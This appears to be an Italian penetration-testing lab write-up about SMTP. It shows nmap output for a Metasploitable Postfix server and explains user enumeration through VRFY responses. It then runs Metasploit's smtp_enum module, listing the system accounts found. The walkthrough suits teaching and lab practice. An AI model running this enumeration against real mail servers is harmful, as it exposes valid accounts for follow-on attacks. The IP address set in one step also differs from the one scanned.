# SMTP: Simple Mail Tranfer Protocol

SMTP è il protocollo standard per la trasmissione dei messaggi di posta elettronica. Questo protocollo è tanto utilizzato quanto datato, la sua definizione risale all'RFC 788 del 1981, anche se negli anni è stato diverse volte aggiornato. La macchina target espone un server SMPT sulla porta 25, rivediamo quindi il risultato dell'enumeration:

```
PORT      STATE  SERVICE     VERSION
25/tcp    open   smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
|_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
|_ssl-date: 2021-12-05T20:32:36+00:00; -25m48s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
```
Abbiamo quindi un server Postfix configurato per supportare comunicazioni crittografate a livello trasporto con ssl (SMTPS). Uno dei più diffusi exploit su questo protocollo è quello della cosiddetta SMTP enumeration, un attacco che utlilizza comandi quali `VRFY` o `EXPN`. Infatti ad esempio lanciando un comando `VRFY someuser` il server restituisce un messaggio con codice 550 se l'utente non esiste, con codice 250 se l'utente invece esiste. \'E quindi comprensibile il fatto che in molte implementazioni questi comandi siano disabilitati, ma spesso non lo sono ed è sempre utile per un attaccante provare un attacco.
Andiamo su `msfconsole` e cerchiamo un modulo che ci consenta di fare questo tipo di enumeration.

```
msf6 > search name:smtp

Matching Modules
================

   #   Name                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                    ---------------  ----       -----  -----------
   0   auxiliary/server/capture/smtp                                            normal     No     Authentication Capture: SMTP
   1   exploit/windows/browser/communicrypt_mail_activex       2010-05-19       great      No     CommuniCrypt Mail 1.16 SMTP ActiveX Stack Buffer Overflow
   2   auxiliary/client/smtp/emailer                                            normal     No     Generic Emailer (SMTP)
   3   exploit/linux/smtp/haraka                               2017-01-26       excellent  Yes    Haraka SMTP Command Injection
   4   exploit/windows/smtp/mercury_cram_md5                   2007-08-18       great      No     Mercury Mail SMTP AUTH CRAM-MD5 Buffer Overflow
   5   exploit/windows/smtp/njstar_smtp_bof                    2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow
   6   exploit/unix/smtp/opensmtpd_mail_from_rce               2020-01-28       excellent  Yes    OpenSMTPD MAIL FROM Remote Code Execution
   7   exploit/unix/local/opensmtpd_oob_read_lpe               2020-02-24       average    Yes    OpenSMTPD OOB Read Local Privilege Escalation
   8   exploit/unix/smtp/qmail_bash_env_exec                   2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   9   auxiliary/scanner/smtp/smtp_version                                      normal     No     SMTP Banner Grabber
   10  auxiliary/scanner/smtp/smtp_ntlm_domain                                  normal     No     SMTP NTLM Domain Extraction
   11  auxiliary/scanner/smtp/smtp_relay                                        normal     No     SMTP Open Relay Detection
   12  auxiliary/fuzzers/smtp/smtp_fuzzer                                       normal     No     SMTP Simple Fuzzer
   13  auxiliary/scanner/smtp/smtp_enum                                         normal     No     SMTP User Enumeration Utility
   14  auxiliary/dos/smtp/sendmail_prescan                     2003-09-17       normal     No     Sendmail SMTP Address prescan Memory Corruption
   15  exploit/unix/webapp/squirrelmail_pgp_plugin             2007-07-09       manual     No     SquirrelMail PGP Plugin Command Execution (SMTP)
   16  exploit/windows/smtp/sysgauge_client_bof                2017-02-28       normal     No     SysGauge SMTP Validation Buffer Overflow
   17  exploit/windows/smtp/mailcarrier_smtp_ehlo              2004-10-26       good       Yes    TABS MailCarrier v2.51 SMTP EHLO Overflow
   18  exploit/windows/email/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)
   19  auxiliary/scanner/http/wp_easy_wp_smtp                  2020-12-06       normal     No     WordPress Easy WP SMTP Password Reset


Interact with a module by name or index. For example info 19, use 19 or use auxiliary/scanner/http/wp_easy_wp_smtp

```
Il modulo di nostro interesse è il 13, lo scegliamo e vediamo quali opzioni vanno configurate con `show options`

```
msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                              Required  Description
   ----       ---------------                              --------  -----------
   RHOSTS                                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usi
                                                                     ng-Metasploit
   RPORT      25                                           yes       The target port (TCP)
   THREADS    1                                            yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                         yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordli  yes       The file that contains a list of probable users accounts.
              sts/unix_users.txt

```

Va quindi inserito solo l'indirizzo della macchina target, digitando il comando `set RHOSTS 192.168.65.102` e siamo pronti a lanciare l'exploit.

```
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 192.168.56.102:25     - 192.168.56.102:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
[+] 192.168.56.102:25     - 192.168.56.102:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
[*] 192.168.56.102:25     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Abbiamo quindi scoperto una lunga lista di nomi utente presenti sulla macchina target.

